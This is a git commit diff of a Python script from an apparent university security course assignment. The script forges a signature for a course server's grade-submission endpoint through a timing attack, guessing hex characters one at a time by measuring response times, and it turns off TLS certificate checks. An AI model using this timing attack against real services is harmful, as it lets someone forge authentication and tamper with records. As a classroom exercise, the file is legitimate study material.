59bdb38443a7e5ee4096caf9f9102871cd510134
VictorWinberg <dat14vwi@student.lu.se>
2017-12-05 09:56:03 +0100

    optimize HA4 B2 with min response-time

--- HA4/B2.py
+++ HA4/B2.py
@@ -2,15 +2,8 @@ import requests
 
 requests.packages.urllib3.disable_warnings()
 
-def sort(chars, cut=4):
-  top = sorted(chars, key=lambda x: -x[1])[:cut]
-  return [ x for x, y in top ]
-
-def most_common(L):
-  return max(set(L), key=L.count)
-
 # An timing attack based on time consuming chrcmp function
-def timing_attack(name, grade, size=20, retries=20):
+def timing_attack(name, grade, size=20, retries=10):
   url = 'https://eitn41.eit.lth.se:3119/ha4/addgrade.php'
   params = {'name': name, 'grade': grade, 'signature': ''}
   hex_string = '0123456789abcdef'
@@ -19,22 +12,18 @@ def timing_attack(name, grade, size=20, retries=20):
   signature = [''] * size
 
   for i in range(size):
-    sig_chars = []
+    max_t = 0
 
-    for RETRY in range(retries):
-      chars = []
+    for j in range(len(hex_string)):
+      params['signature'] = ''.join(signature[:i]) + hex_string[j]
 
-      for j in range(len(hex_string)):
-        params['signature'] = ''.join(signature[:i]) + hex_string[j]
+      R = [requests.get(url, params, verify=False) for i in range(retries)]
+      t = min([r.elapsed.total_seconds() for r in R])
 
-        r = requests.get(url, params, verify=False)
-        t = r.elapsed.total_seconds()
+      if(t > max_t):
+        max_t = t
+        signature[i] = hex_string[j]
 
-        chars.append((hex_string[j], t))
-
-      sig_chars.extend(sort(chars))
-
-    signature[i] = most_common(sig_chars)
     print('{}/{}'.format(i+1, size), ''.join(signature))
   
   params['signature'] = ''.join(signature)
